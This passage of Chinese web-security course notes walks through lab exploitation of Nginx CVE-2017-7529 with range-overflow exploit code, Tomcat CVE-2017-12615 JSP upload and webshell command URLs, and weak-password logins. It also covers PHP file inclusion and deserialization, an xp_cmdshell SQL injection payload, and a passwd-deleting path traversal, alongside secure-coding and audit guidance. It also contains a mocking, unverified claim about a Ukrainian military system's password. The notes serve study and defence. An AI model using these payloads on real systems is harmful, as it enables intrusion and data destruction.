    - suffix-byte-range-spec = "-" suffix-length 

  - 其中： 

    - first-bytes-pos 指定了访问的第一个字节，
    - last-byte-pos 指定了最后一个字节，
    - suffix-length 则表示要访问资源的最后 suffix-length 个字节的内容。 

  - 如果一次请求有多个 Range，返回的数据需要 multipart 来组织 

    - ![1618916764740](HackerMeWeb.assets/1618916764740.png)

  - HTTP-Cache 

    - Nginx 可以作为缓存服务器，将 Web 应用服务器返回的内容缓存起来。如果客户端请求的内容已经被缓存，那么就可以直接将缓存内容返回，而无需再次请求应用服务器。由此，可降低应用服务器的负载，并提高服务的响应性能。 
    - HTTP-Cache  配置文件
      - ![1618916944542](HackerMeWeb.assets/1618916944542.png)
      - 示例文件：HackerMeCode\Nginx\default.conf

  - HTTP-Cache 漏洞利用

    - 使用 POC 示例程序，HackerMeCode\Nginx\poc.py，在命令行中输入命令 python poc.py http://127.0.0.1:8080/
    - 就可以在命令行中获得输出内容如下所示，如果读取有误，调整poc.py中的偏移地址（605）
      - 备注：我自行测试的时候，这种方式失败了，失败的原因是，自己启动了 Burpsuite
      - 只需要关闭 Burpsuite，就可以实现漏洞利用
    - 越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容
      - ![1618917192388](HackerMeWeb.assets/1618917192388.png)

    - 新方式漏洞利用
      - 访问谜团靶场
        - https://mituan.talentsec.cn/ 或者
        - https://mituan.zone/
      - 注册用户，登录，搜索极客时间，进入 专题 · 极客时间课程系列
      - 点击右下角的 立即创建，创建 专题靶场，点击开始练习，选择靶机2，nginx专题：CVE–2017–7529，点击打开，就可以创建一个新的实例
      - 然后会在浏览器打开一个新的 Tab 页面，http://d0d488e434474f46a017c0a0f2d7f4e6.app.mituan.zone:8080/
      - 使用 POC 示例程序，HackerMeCode\Nginx\poc.py，在命令行中输入命令 python poc.py http://d0d488e434474f46a017c0a0f2d7f4e6.app.mituan.zone:8080/
      - 此时就可以实现漏洞利用

  - HTTP-Cache 漏洞原理分析

    - Nginx 对 Range 的支持包括 header 处理和 body 处理，分别用来解析客户端发送过来的 Range header 和裁剪返回给客户端的请求数据 Body。

      - ngx_http_range_header_filter_module
      - ngx_http_range_body_filter_module 

    - 关键在于在 header 中 range 的解析过程 

      - ![1618919812612](HackerMeWeb.assets/1618919812612.png)

    - 在 ngx_http_range_parse 函数中有这样一个循环，这段代码是要把“-”两边的数字取出分别赋值给start 和 end 变量，字符串指针 p 中即为“bytes=”后面的内容。 

      - ![1618919923758](HackerMeWeb.assets/1618919923758.png)

    - 在该段代码中存在 cutoff 和 cutlim 阈值限定了从字符串中读取时不会让 start 或 end 为负值，所以这里需要进入 suffix = 1的分支，因此使用Range:bytes=-xxx，即省略初始 start 值的形式。 

    - start 等于 content_length 减去 end 值，所以如果传入的 end 比实际长度还要长，就可以使 start 变为负数。

    - 最终 end 的值会被设定为 content_length - 1 

    - 通过上面的设定后，这块 range 的总长度就超过了content-length。而 Nginx 对 range 总长度会有检查，但是注意到 size 的值是 multipart 的全局 range 长度相加得到，

    - 因此，一个 range 是不够的，至少需要两个 range，其长度之和溢出为负数，就可以绕过总长度的检查了。 

    - 这里的 for 循环是一个无条件的循环，有一个退出条件为*p!=‘，’

    - 支持 range 的值为start1-end1,start2-end2,... ...的形式构造 range:bytes=-x,-y。一大一小两个 end 值，只需要控制前面一个 end 值小而后一个 end 值大，从而实现start 值和 size 值皆为负数，控制 start 值负到一个合适的位置，那么就能成功读到缓存文件头部了。 

    - 漏洞利用程序 HackerMeCode\Nginx\poc.py

      - ```python
        offset = 605
        file_len = len(requests.get(url, headers=headers).content)
        n = file_len + offset
        headers['Range'] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
        ```

      - 第一个 range 的值为报文长度加偏移量start=conten_length-end，将 end 的值设置为报文长度加偏移量，start 得到的值就是负的偏移量。

      - 第二个 range 的值要溢出总长度目标总和 size 为0×8000000000000000。第一段的长度为 n，第二段的长度为0x8000000000000000 - n 



### Tomcat 安全

#### Tomcat 简介 

- Tomcat 是 Apache 软件基金会（Apache Software Foundation）的 Jakarta项目中的一个核心项目，由 Apache、Sun 和其他一些公司及个人共同开发而成。 
- Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用。
- 实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行 Tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的。 



#### 配置文件错误 & Nday 漏洞 ：CVE-2017-12615 

- 安装靶机
  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/tomcat01:latest
  - docker run --name=tomcat01 -d -p 0.0.0.0:8080:8080 registry.cn-shanghai.aliyuncs.com/yhskc/tomcat01:latest
  - 访问
    - https://127.0.0.1:8080
    - 前提是关闭 BurpSuite
- 漏洞信息
  - 漏洞编号： CVE-2017-12615 
  - 影响版本： Apache Tomcat 7.0.0 to 7.0.79 
  - 漏洞说明：当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，实现任意写文件。之后，JSP 文件中的代码将能被服务器执行。 
- 漏洞测试
  - 方式一：本机 docker 测试
    - 访问127.0.0.1:8080，修改数据包为 
  - 方式二：谜团靶场平台 测试
    - 访问 https://mituan.zone/#/
    - 进入 我的靶场，专题 · 极客时间课程系列，开始练习，tomcat专题：CVE-2017-12615，打开
    - 新的 tab 页面会弹出，http://67897af750394c868d08c6244b3acf04.app.mituan.zone:8080/，展示出 tomcat 页面，就启动成功
    - 使用 BurpSuite ，在 Target 的 Scope 中设置 Use advanced scope control，Add 一个新的，Host 为 67897af750394c868d08c6244b3acf04.app.mituan.zone
    - 访问，http://67897af750394c868d08c6244b3acf04.app.mituan.zone:8080/，此时就可以在 BurpSuite 看到一条 GET 请求， 右键 Send to Repeater 
    - 将 GET 请求更换为 PUT，将 / 更换为 /1.jsp/，`PUT /1.jsp/ HTTP/1.1`
    - 在 body 部分添加 jsp 表达式，内容为 `<%out.print("Hello rmliu");%>` ，点击 Send，看到返回 200
    - 浏览器访问，http://67897af750394c868d08c6244b3acf04.app.mituan.zone:8080/1.jsp，可以看到展示内容为 Hello rmliu
    - 也可以更换其他的 jsp 内容
      - 示例程序：HackerMeCode\Tomcat\1.jsp
        - 备注：自行测试的时候，这个示例程序不能工作！
      - ![1618923697652](HackerMeWeb.assets/1618923697652.png)
    - 验证木马可以成功的执行系统命令 
      - 自行测试失败，如果成功，会显示下面的内容的，访问网址：http://67897af750394c868d08c6244b3acf04.app.mituan.zone:8080/1.jsp?pwd=023&i=ls%20-l
      - ![1618924610888](HackerMeWeb.assets/1618924610888.png)
- 漏洞原理
  - 在配置文件中将 readonly 选项置为了 false 
  - ![1618924647936](HackerMeWeb.assets/1618924647936.png)





#### 弱口令 

- Tomcat 存在后台管理界面，后台管理界面的访问路径为： 
  - http://your-ip:8080/manager/html
- 安装靶机
  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/tomcat02:latest 
  - docker run --name=tomcat2 -d -p 0.0.0.0:8080:8080 registry.cn-shanghai.aliyuncs.com/yhskc/tomcat02:latest
  - 访问：
    - http://127.0.0.1:8080/
    - 前提是关闭 BurpSuite
- 使用 谜团靶场平台
  - 选择 tomcat专题：弱口令，点击打开，弹出新 Tab
  - http://4b163f4217464ec6b52343b91368691c.app.mituan.zone:8080/
- 弱口令测试
  - 首先尝试弱口令登录，这里可以直接使用弱密码登录 
  - 输入网址：http://4b163f4217464ec6b52343b91368691c.app.mituan.zone:8080/manager/html
  - 输入用户名：tomcat
  - 密码：tomcat
  - 就直接登录进去了，可以看到内部的服务等信息
- 弱口令的漏洞虽然看似简单，但是在很多地方都存在,而且在tomcat的后台是可以部署war包的,也就相当于构造了文件上传
- 在存在输入用户名和密码的窗口中都可以尝试使用弱口令进行登录
- 乌克兰武装部队的“第聂伯罗”军事自动化控制系统，服务器网络保护十分原始，账号是admin，密码是123456，hahah~



### PHP 安全 

#### 超全局变量

- PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。
- 在函数或方法中无需执行 global $variable; 就可以访问它们：
  - `$GLOBALS，$_SERVER，$_GET，$_POST，$_FILES，$_COOKI，$_SESSION，$_REQUEST
    $_ENV`
  - 它们受到 variables_order 变量的控制。 



#### php.ini

- 配置文件（php.ini）在 PHP 启动时被读取。
- 对于服务器模块版本的 PHP，仅在 Web 服务器启动时读取一次。
- cli（命令行）每次使用重新读取。
- php.ini 内部 variables_order 参数控制着超全局变量。 
- 查看服务器中的 php.ini 文件
  - find / -name "php.ini"
  - ![1618973304125](HackerMeWeb.assets/1618973304125.png)
  - ![1618973414495](HackerMeWeb.assets/1618973414495.png)



#### $_SERVER 

- PHP 环境变量允许开发者的脚本从服务器动态收集某些类型的数据。 
- 保证 PHP 程序在不同服务器正确运行。例如 DOCUMENT_ROOT , CONTEXT_DOCUMENT_ROOT变量将自动获得网站的根目录，而无需在脚本中进行任何更改。 
- 输出示例：
  - 示例程序：HackerMeCode\PHP\t2.php
  - 借助于 bwapp 漏洞容器，选择  Unrestricted File Upload，上传 t2.php 文件
  - 打开网址，http://127.0.0.1/images/t2.php，就可以看到对应的输出信息
  - ![1618973787671](HackerMeWeb.assets/1618973787671.png)



#### phpinfo()

- 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息（License）。从 php.ini 配置获取。
- 常常关联着敏感信息泄露的问题。 



#### 敏感信息泄露 

- phpinfo()
  - 确切的 PHP版本
  - 操作系统和它的版本
  - PHP 详细配置
  - IP 地址信息
  - 服务器的环境变量
  - PHP 扩展及其配置 
  - ![1618973910897](HackerMeWeb.assets/1618973910897.png)
- 容器版本 
  - SERVER_SOFTWARE   Apache/2.4.7 (Ubuntu) 
  - 配合 Apache 这个版本的 CVE 漏洞，获取 shell。
-  网站根目录 
  - DOCUMENT_ROOT 	/var/www/html
  - 网站根目录，配合 SQL 注入漏洞，如 SQLMap 的-os-shell，直接获取 shell。 
- 本地（远程）文件包含 
  - allow_url_fopen		On
  - allow_url_include	Off
  - allow_url_fopen 默认开启，关闭会导致应用程序故障，
  - allow_url_include 默认关闭，如果打开，易出现远程文件包含漏洞。 
  - ![1618974272609](HackerMeWeb.assets/1618974272609.png)
- 真实 IP 泄露 
  - SERVER_ADDR 	172.17.0.2
  - 直接绕过 CDN，得到真实 IP，后续可继续查旁站 IP 和 C 段。 
- 禁用的方法
  - disable_functions	pcntl_alarm,pcntl_fork ..... .....
  - 在构造木马 webshell 的过程，需要知道哪些方法是被禁用了的，有针对的过滤。 
- 限定访问位置
  - open_basedir	no value
  - PHP 能够访问的目录是否有限制。 
- 短标签的使用
  - short_open_tag	Off
  - <?php ?>是 PHP 程序标准形式，打开此开关，将允许<? ?>，在构造 shell 过程中有帮助。 
- 缓存
  - opcache.enable	On	On
  - 缓存 PHP 文件，文件类型为 ~.bin,配合文件上传（一般不过滤 bin）覆盖，再调用达到加载恶意文件的目的。 
- Phar 的利用
  - ![1618974749232](HackerMeWeb.assets/1618974749232.png)
  - 使用 Phar://伪协议流可以 Bypass 一些上传的 waf，大多数情况下和文件包含一起使用，同时关联,一些反序列化漏洞。 
- 支持的程序
  - 服务器是否加载了 Redis、Memcache、MongoDB、MySQL、cURL，还有 Gopher。 



#### 远程文件包含漏洞

- 在没干信息泄露中，allow_url_fopen	allow_url_include
  - ![1618974272609](HackerMeWeb.assets/1618974272609.png)
  - 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这其中文件调用的过程一般被称为文件包含。
  - 程序开发人员一般希望代码更灵活，所以被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
  - 几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP中巨多，其他语言编写的程序相对较少。
- 谜团靶场平台测试
  - 进行高安全级别文件上传漏洞的利用
  - 打开谜团网站，https://mituan.zone/，登录，搜索 bwapp 靶场，创建，打开
  - 弹出新 Tab 页面，http://beefe2e5c78544c8a030c00f8197be5c.app.mituan.zone/login.php
  - 初始化数据库，http://beefe2e5c78544c8a030c00f8197be5c.app.mituan.zone/install.php
  - 创建新用户，登录用户
  - 选择bug 类型，Unrestricted File Upload，等级 **high**
    - 创建 test.jpg 文件
      - 示例程序：HackerMeCode\PHP\test.jpg
    - 上传文件，并在打开，http://beefe2e5c78544c8a030c00f8197be5c.app.mituan.zone/images/test.jpg
  - 选择新的bug类型，Remote & Local File Inclusion (RFI/LFI)，等级 low
    - 网址，http://beefe2e5c78544c8a030c00f8197be5c.app.mituan.zone/rlfi.php?language=lang_en.php&action=go
    - 使用 百度测试，http://beefe2e5c78544c8a030c00f8197be5c.app.mituan.zone/rlfi.php?language=http://www.baidu.com&action=go
      - 页面内嵌 百度首页 的页面
    - 使用  test.jpg 测试，http://beefe2e5c78544c8a030c00f8197be5c.app.mituan.zone/rlfi.php?language=http://beefe2e5c78544c8a030c00f8197be5c.app.mituan.zone/images/test.jpg&action=go
      - 页面输出 123
    - 备注：可以更换为新的文件 HackerMeCode\PHP\test2.jpg 进行测试，可以看到完整的 phpinfo



#### 魔术方法 

- `__construct()， __destruct()， __call()， __callStatic()， __get()， __set()
  ， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invo
  ke()， __set_state()， __clone() 和 __debugInfo()` 等方法在 PHP 中被称为魔术方法（Magic methods）。
- 在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。 



#### 函数黑魔法

- php 读取文件其实是读取数据流
  - `php://input` 可以访问原始请求数据中的只读流
  - 这里令`$a = "php://input"` ，并在请求主题中提交字符串
- eregi() 截断漏洞
  - ereg() 函数 或eregi() 函数  存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据
- 弱比较
  - 若字符串以数字开头，则取开头数字作为转换结果，若无则输出 0
- md5()，sha1()
  - md5() 是不能处理数组的，md5(数组) 会返回null，两个null 相等绕过 sha1() 也是同理
- 转换
  - PHP 会自动进行转换，比如 16 进制，科学计数法等，有时也用这点绕过
- intval()
  - intval() 转换的时候，会将 从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回0.
- strcmp()
  - strcmp() 函数只有在相等的情况下返回0。
  - 那么我们传入一个数组，他会返回 null，而判断使用了 \==，而null\==0 是 bool(true)，这样就成功绕过
- ereg()
  - 字符串对比解析，ereg 函数存在 null 截断漏洞，当 ereg 读取字符串 string 时，如果遇到了 %00，后面的字符串就不会被解析
  - 注意：这里的 %00 是需要 urldecode 才可以截断的，这是 url 终止符，且 %00 长度是 1 不是 3
- is_numeric()
  - 当两个 is_numeric 判断并且 and 连接时，and 后面的 is_numeric 可以绕过
  - 16进制也可以绕过 is_numeric 检验，可以用来绕过 sql 注入里的过滤
  - 例如，将 '1 or 1' 转换为 16 进制形式，再传参，就可以造成 SQL 注入
- switch()
  - 当 switch 没有 break 时，可以继续往下执行
  - 这里也有自动转换，比如 $switch_bug = a 会当0执行，=1a，会当1执行
- array_search()
  - 用到了 PHP 弱类型的一个特性，当一个整形和一个其他类型进行比较的时候，会先把其他类型 intval 再比
  - 当检索中带入字符串，比如 “sky”，会 intval('sky') == 0，从而致使数组数组也可以查询成功
- 弱类型比较 之 松散比较 ==
  - https://www.php.net/manual/zh/types.comparisons.php
  - "php" == 0 => true
  - ![1618979693512](HackerMeWeb.assets/1618979693512.png)
- 协议流
  - 为了读取包含有敏感信息的 PHP 等源文件，我们就要先将可能引发冲突的 PHP 代码 编码一遍，这里就会用到 php://filter
  - php://filter 是 PHP 语言中特有的协议流
  - 作用是作为一个 中间流 来处理其他流，比如我们可以用如下一行代码将 POST 内容转换成 base64 编码并输出
    - `readfiel("php://filte/read=convert.base64/resource=php://input");`
  - 所以，在 XXE 中，我们也可以将 PHP 等容易引发冲突的文件流用 php://filter 协议列处理一遍，这样就能有效规避特殊字符造成混乱
    - `php://filter/read=convert.base64/resource=./xxe.php`



#### 面向对象 

![1618991818550](HackerMeWeb.assets/1618991818550.png)



#### 序列化与反序列化 

- Serilize
- Deserilize

![1618991857548](HackerMeWeb.assets/1618991857548.png)



#### 4个常见魔术方法

- `__construct()`：类的构造方法，对象在创建的过程中自动调用。
- `__destruct()`：类的析构方法，对象在销毁的过程中自动调用。
- `__call()` : 当程序调用不存在的方法时，`__call()`用于避免程序意外终止。
- `__wakeup() `：执行反序列化时，会先调用这个函数。 



##### \__construct() __destruct 

- 示例程序：HackerMeCode\PHP\Person1.php
- 执行：php Person1.php



##### \__call() 

- 示例程序：HackerMeCode\PHP\Person2.php
- 执行：php Person2.php



##### 序列化 

- 示例程序：HackerMeCode\PHP\Person3.php
- 执行：php Person3.php





##### 反序列化与\__wakeup() 

- 示例程序：HackerMeCode\PHP\Person4.php
- 执行：php Person4.php
- __wakeup() 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 



#### 反序列化漏洞（XSS） 

- 使用谜团靶机，搜索 bwapp，创建，打开，弹出新 Tab 
- 初始化，http://70772b1ac6f44673aa83ca1ee837e161.app.mituan.zone/install.php，点击 here
- 创建新用户，123/123
- 登录用户，选择 bug，Unrestricted File Upload
- 上传文件，示例程序 ，HackerMeCode\PHP\wakeup1.php
- 访问文件，弹出对话框，内容为 1，http://70772b1ac6f44673aa83ca1ee837e161.app.mituan.zone/images/wakeup1.php



#### 反序列化漏洞（代码执行） CVE-2016-7124 

- 直接查看方式
  - 使用谜团靶机，搜索 bwapp，创建，打开，弹出新 Tab 
  - 初始化，http://70772b1ac6f44673aa83ca1ee837e161.app.mituan.zone/install.php，点击 here
  - 创建新用户，123/123，登录用户
  - 直接查看漏洞，http://70772b1ac6f44673aa83ca1ee837e161.app.mituan.zone/cve.php
    - 此时就会出现 phpinfo 的内容
- 上传脚本文件方式
  - 示例程序文件：HackerMeCode\PHP\cve.php
  - 此时漏洞执行访问，
    - http://127.0.0.1/cve.php 或者
    - http://127.0.0.1/escape.php （需要进入容器中，进行该文件的权限设置，命令chmod 777 escape.php）
- 更改序列化内容长度测试
  - 示例程序文件：HackerMeCode\PHP\cve1.php
  - 此时是无法进行代码执行漏洞测试的，反序列化的时候会报错



#### 安全编码要求

- 总则
  - 绝对安全的系统是不存在的。
  - 最好的安全机制应该能在不防碍用户，并且不过多地增加开发难度的情况下做到能满足需求。
  - 木桶原理，一个系统的的强度是由它最薄弱的环节决定的， 
- 细则
  - 所有输入的数据都是有害的（直接或者间接由用户输入的）
  - 不依赖运行环境的安全配置
  - 安全控制措施落实在最后执行阶段
  - 最小化
  - 失败终止 



#### 安全编码准则

##### 文件系统安全 

- 删除指定的文件
  - 示例程序：HackerMeCode\PHP\FileSystem\DeleteFile.php
  - 但使用下面的内容时候，此时就会删掉整个 passwd 文件
    - user_submitted_name="../etc"
    - user_submitted_filename="passwd" 
- 删除硬盘中文件
  - 示例程序：HackerMeCode\PHP\FileSystem\DeleteDiskFile.php
  - 思考：../etc 这样的一个用户名 
- 正则匹配文件
  - 示例程序：HackerMeCode\PHP\FileSystem\PregFile.php
  - `（：？` 非捕获分组，仅仅匹配
  - `（？！\.）` 匹配非 . 的内容
  - ../etc在上述正则会导致 die，即 .. 开头的文件不允许
  - / 符号会导致 die。
  - 根据操作系统的不同，存在着各种各样需要注意的文件，包括联系到系统的设置（/dev/或者COM1）、配置文件（/etc/文件和.ini文件）、常用的存储区域（/home/或者My Documents）等等。
  - 由于此原因，建立一个策略禁止所有权限而只开放明确允许的 通常更容易些。



##### 数据库安全

- 恶意输入

  - 尽量避免直接的数据库查询语句的拼接，无论数据库种类。 

  - ```php
    <?php
    $query = "SELECT * FROM products WHERE id LIKE '%$prod%'";
    $result = mssql_query($query);
    ?>
    
    当$prod ==> a%' exec master..xp_cmdshell 'net user test testpass /ADD' -- 时候，新的PHP代码如下：
    
    
    <?php
    $query = "SELECT * FROM products WHERE id LIKE '%a%' 
              exec master..xp_cmdshell 'net user test testpass /ADD' --%'";
    $result = mssqL_query($query);
    
    ?>
    
    ```

- 错误输出

  - 尽量避免直接输出原本的数据库错误信息，而自行构造。 

  - ```php
    <?php
    $sql = "SELECT * FROM movies WHERE title LIKE'%" . sqli($title) . "%'";
    
    $recordset = mysql_query($sql, $link);
    if (!$recordset) {
        die("Error:查询失败");
    }
    
    ?>
    ```

- 在使用数据库时候，对于敏感信息加密存储：

  - ```sh
    md5($pass)
    md5($salt.md5($pass))
    SHA-1
    SHA-2(SHA-224，SHA-256，SHA-384和SHA-512)
    ```

- 推荐使用：

  - ```sh
     md5($salt.md5($pass)) 与 SHA-256 
    ```



##### 命令执行安全

- 如果命令执行不可缺少，使用白名单的形式，并且硬编码进制拼接

- ```php
  <?php
  $targetUrl = $_POST ["target"];
  
  switch ($targetUrl) {
      case "www.target.com":
          echo "" . shell_exec("nslookup www.target.com");
          break;
      case "web.target.com":
          echo "" . shell_exec("nslookup web.target.com");
          break;
      default:
          echo "" . shell_exec("nslookup www.target.com");
  }
  
  ?>
  ```



##### XSS 安全

```php
<?php
// 用户可控数据不需存储直接响应的，硬编码输出。
echo $this->securityUtil->encodeForHTML($data);
echo $this->securityUtil->encodeForJavaScript($data);

// 用户可控数据需存储响应,应过滤危险字符。
$this->securityUtil->purifier($_GET["data"]);

?>
```



##### 资源泄露安全

```php
<?php

$file = fopen("temp.txt", "w") or die("Unable to open file!");
fclose($file);

?>
```



##### 本地文件包含安全 

- 当必须要接受外部文件名的时候，同样使用白名单更好

```php
<?php

$filename = $_GET["filename"];
switch ($filename) {
    case "file.txt" :
        include("./file.txt");
        break;
    case "file.php" :
        include("./file.php");
        break;
    default:
        include("./ readme.txt");
}

?>
```



##### 任意文件上传安全

```php
<?php

$config = array('limit' => 5 * 1024 * 1024,  // 允许上传的文件最大大小
    'type' => array(                         // 允许的上传文件后缀及MIME
        "gif" => "image/gif",
        "jpg" => " image/jpeg",
        "png" => " image/png")
);

$file = $_FILES ["file"];
$data = $this->securityUtil->verifyuploadFile($file, $config);
if ($data['flag'] !== true) {
    return;  // 上传失败
}

?>
```



### Java Web安全 

#### 初代 MVC 架构示意 

![1618999578875](HackerMeWeb.assets/1618999578875.png)



#### Java Web 发展历程

![1618999607703](HackerMeWeb.assets/1618999607703.png)



#### Java Web Application 

##### Servlet 

- docekr 安装 tomcat2，registry.cn-shanghai.aliyuncs.com/yhskc/tomcat02:latest 
- docker exec -it tomcat02 bash
- cd /usr/local/tomcat/webapps
  - more HelloWorld.java
  - ![1618999968373](HackerMeWeb.assets/1618999968373.png)
- cd /usr/local/tomcat/webapps/ROOT/WEB-INF
  - more web.xml
  - ![1619000239845](HackerMeWeb.assets/1619000239845.png)



##### Jsp 

- cd /usr/local/tomcat/webapps/ROOT
- more index.jsp
- http://127.0.0.1:8080/index.jsp
- 上传 shell.jsp 脚本
  - 示例程序：HackerMeCode\JavaWeb\shell.jsp
  - ![1619000727788](HackerMeWeb.assets/1619000727788.png)

##### Spring MVC 

- 重点是 DispatcherServlet

![1619000755460](HackerMeWeb.assets/1619000755460.png)



##### Servlet 继承关系 

![1619001135844](HackerMeWeb.assets/1619001135844.png)



##### Spring Microservices 

![1619001170156](HackerMeWeb.assets/1619001170156.png)



#### 代码审计 

软件代码审计是对编程项目中的源代码进行的全面分析，主要目的是发现错误，安全漏洞或违反编程约定的情况。 它是防御性编程的组成部分，旨在软件发布前尽可能减少错误。 



#### 代码审计方式

审计之前，创建一个核心问题清单，包括安全漏洞，身份验证问题，授权问题，内存泄漏和不良设计习惯之类的问题。

跟踪用户输入数据和敏感函数参数回溯，最为常用。 





#### 审计要点 

##### 目录结构 

![1619001679073](HackerMeWeb.assets/1619001679073.png)

![1619001713326](HackerMeWeb.assets/1619001713326.png)



##### 密码硬编码

出现位置：
1. properties 后缀文件
2. java 后缀文件
3. xml 后缀文件 

![1619001775494](HackerMeWeb.assets/1619001775494.png)



##### 明文存储 

关键词：
1. password
2. pass
3. jdbc
4. username
5. 其他第三方软件（Redis） 

![1619001798927](HackerMeWeb.assets/1619001798927.png)



##### 命令注入 

关键词：
1. getRuntime
2. exec
3. ProcessBuilder
4. shell 

![1619009416090](HackerMeWeb.assets/1619009416090.png)



##### 文件上传 

关键词：
1. upload
2. MultipartFile
3. fileName
4. filePath 

![1619009475751](HackerMeWeb.assets/1619009475751.png)



##### 越权，URL 跳转 

关键词：
1. sendRedirect
2. setHeader
3. forward 

![1619009526951](HackerMeWeb.assets/1619009526951.png)



##### sql 注入

Select、Dao 、from 、delete 、update、insert 、 createStatement



##### 反序列化

readObject 、 readUnshared 、JSON.parseObject



#####  XSS

getParamter、 param



##### XML 注入 

 XMLStreamReader 、 SAXReader 、XMLReader 等 



#### Fortify

Fortify SCA 是一款静态应用程序安全性测试 （SAST）产品，可供开发团队和安全专家分析源代码，检测安全漏洞，帮助开发人员更快更轻松地识别问题并排定问题优先级，然后加以解决。 



### Node.js 安全 

#### Node.js

Node.js 是一个开源的、跨平台的运行时环境，有了它，开发人员可以使用 JavaScript 创建各种服务器端工具和应用程序。

此应用可以应用与浏览器上下文之外（即可以直接运行于计算机或服务器操作系统上）。 



#### Express

- 是最流行的 Node 框架，是许多其他流行 Node 框架的底层库
- 虽然 Express 本身是极简风格的，但是开发人员通过创建各类兼容的中间件包，解决了几乎所有的 Web 开发问题
- 这些库可以实现 cookie，会话，用户登录，URL参数，post数据，安全头等功能
- 为不同 URL 路径中使用不同 HTTP 动词的请求（路由）编写处理程序。
- 集成了“视图”渲染引擎，以便通过将数据插入模板来生成响应。
- 设置常见 Web 应用设置，比如用于连接的端口，以及渲染响应模板的位置。
- 在请求处理管道的任何位置添加额外的请求处理“中间件”。 



#### Node 测试

- node 官网：https://nodejs.org/en/
- 下载安装，npm -v，查看安装版本
- 创建 hello.js，示例程序：HackerMeCode\Nodejs\hello.js
- 命令行输入，node hello.js
- 浏览器访问：http://127.0.0.1/
  - 可以看到浏览器展示：hello world



#### Express 测试

- 安装 Express ，新建一个文件夹 Nodejs ，进入其中，启动命令行，输入：npm install express
  - 然后就可以安装好 express
- 创建 app.js 测试文件，示例程序：HackerMeCode\Nodejs\app.js
- 命令行输入，node app.js
- 浏览器访问：http://127.0.0.1/hello
  - 可以看到浏览器展示：Hello friends!



#### 路由模块 

- 创建 download.js 测试文件，示例程序：HackerMeCode\Nodejs\download.js
- 创建 main.js 测试文件，示例程序：HackerMeCode\Nodejs\main.js
- 命令行输入，node main.js
- 浏览器访问：
  - http://127.0.0.1/
  - http://127.0.0.1/news
  - http://127.0.0.1/download
  - http://127.0.0.1/download/docs
  - 可以看到浏览器展示的不同结果
- app.use 表示对所有路由，和所有方法都调用中间函数
- app.get('/') 表示对get 方法，/ 开头的 URL 调用中间函数
- app.use('/download') 表示对  /download 开头的所有路由，调用中间函数



#### 中间件

- 安装 日志模块中间件
  - npm install morgan
- 中间件和路由函数是按声明顺序调用的。 
- 中间件在 Express 应用中得到了广泛使用
- 大多数应用会使用第三方中间件来简化常见的 web 开发任务，比如 cookie，会话，用户身份验证，访问请求 POST和JSON数据，日志记录，压缩HTTP响应等。
- 一些中间件的引入顺序很重要（例如，如果会话中间件依赖于 cookie 中间件，则必须先添加 cookie 处理器）
- 绝大多数情况下要先调用中间件，后设置路由，否则路由处理器将无法访问中间件的功能
- morgan 是一个日志记录的中间件
- 创建 main-morgan.js 测试文件，示例程序：HackerMeCode\Nodejs\main-morgan.js
  - 命令行输入，node main-morgan.js
  - 浏览器访问：
    - http://127.0.0.1/
    - 可以看到会有对应的请求日志信息
- 创建 main-morgan-mid.js 测试文件，示例程序：HackerMeCode\Nodejs\main-morgan-mid.js
  - 命令行输入，node main-morgan-mid.js
  - 浏览器访问：
    - http://127.0.0.1/
    - 可以看到会有对应的请求日志信息，并且每一个请求都会打印 mid function!



#### 静态资源

- 创建 main-morgan-static.js 测试文件，示例程序：HackerMeCode\Nodejs\main-morgan-static.js
- 创建文件： HackerMeCode\Nodejs\public\js\selfjs.js
  - 命令行输入，node main-morgan-static.js
  - 浏览器访问：
    - http://127.0.0.1/
      - 表示 App 工作
    - http://127.0.0.1/js/selfjs.js
      - 可以看到 selfjs.js 文件中的内容，虽然 selfjs.js 文件在 public 文件夹下面放置，但是访问的路径并没有 public



#### 渲染（view,视图） 

- PUG 模版引擎 
  - Pug 是一款健壮、灵活、功能丰富的 HTML 模板引擎,专门为 Node.js 平台开发。Pug 是由 Jade 改名而来。
  - Pug 通过缩进（表示标签间的嵌套关系）的方式来编写代码的过程，在编译的过程中，不需要考虑标签是否闭合的问题。 
  - Express 支持多个版本的模板引擎，如 Jade(pug)、Mustache、Dust 与其它。 
- pug 安装
  - npm install pug
- pug  测试
  - 创建 main-pug.js 测试文件，示例程序：HackerMeCode\Nodejs\main-pug.js
  - 创建文件： HackerMeCode\Nodejs\views\index.pug
    - 命令行输入，node main-pug.js
    - 浏览器访问：
      - http://127.0.0.1/
      - 页面展示 h1 大小的 hello world pug engine!







































































































